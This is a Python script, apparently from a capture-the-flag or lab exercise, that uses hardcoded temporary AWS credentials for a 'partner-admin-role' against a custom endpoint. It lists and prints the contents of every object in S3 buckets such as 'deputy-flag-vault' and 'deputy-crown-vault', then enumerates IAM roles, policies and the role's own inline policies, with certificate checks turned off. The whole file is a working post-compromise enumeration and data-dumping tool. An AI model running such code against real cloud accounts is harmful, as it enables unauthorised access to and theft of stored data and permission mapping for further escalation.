import boto3
import json
import urllib3
urllib3.disable_warnings()

ENDPOINT = "https://web-d94df0e990e63e98.web.h7tex.com"
REGION = "us-east-1"

ADMIN_KEY = "ASIAE67D7B19B5A81056"
ADMIN_SECRET = "sk/TKgKZtYUPONYZHhvlZ4s69N70BSxxn6o"
ADMIN_TOKEN = "tok/3Nn8cYWq3W8qubFf-svfAAksFzipsREu-WsWtcJFyavF4KwqiJJ3jXMfxG0QtaeU"

admin_session = boto3.Session(
    aws_access_key_id=ADMIN_KEY,
    aws_secret_access_key=ADMIN_SECRET,
    aws_session_token=ADMIN_TOKEN,
    region_name=REGION
)

print("[*] Testing partner-admin-role S3 access...")
s3_admin = admin_session.client("s3", endpoint_url=ENDPOINT, verify=False)

for b in ["deputy-flag-vault", "deputy-crown-vault", "deputy-runner-logs", "deputy-analyst-scratch"]:
    print(f"\n--- Checking bucket {b} ---")
    try:
        res = s3_admin.list_objects_v2(Bucket=b)
        print(f"[+] Objects in {b}:", json.dumps(res, indent=2, default=str))
        for obj in res.get("Contents", []):
            k = obj["Key"]
            try:
                body = s3_admin.get_object(Bucket=b, Key=k)["Body"].read().decode(errors="replace")
                print(f"[+] Content of {b}/{k}:\n{body}")
            except Exception as e_get:
                print(f"[-] Get {b}/{k} error:", e_get)
    except Exception as e:
        print(f"[-] List {b} error:", e)

print("\n[*] Testing partner-admin-role IAM access...")
iam_admin = admin_session.client("iam", endpoint_url=ENDPOINT, verify=False)
for act in ["list_roles", "list_policies"]:
    try:
        fn = getattr(iam_admin, act)
        res = fn()
        print(f"[+] IAM {act}:", json.dumps(res, indent=2, default=str))
    except Exception as e:
        print(f"[-] IAM {act} error:", e)

print("\n[*] Inspecting partner-admin-role own policies...")
try:
    pols = iam_admin.list_role_policies(RoleName="partner-admin-role")
    print("[+] Role policies:", pols)
    for p in pols.get("PolicyNames", []):
        print(f"Policy {p}:", iam_admin.get_role_policy(RoleName="partner-admin-role", PolicyName=p))
except Exception as e:
    print("[-] Role policy error:", e)
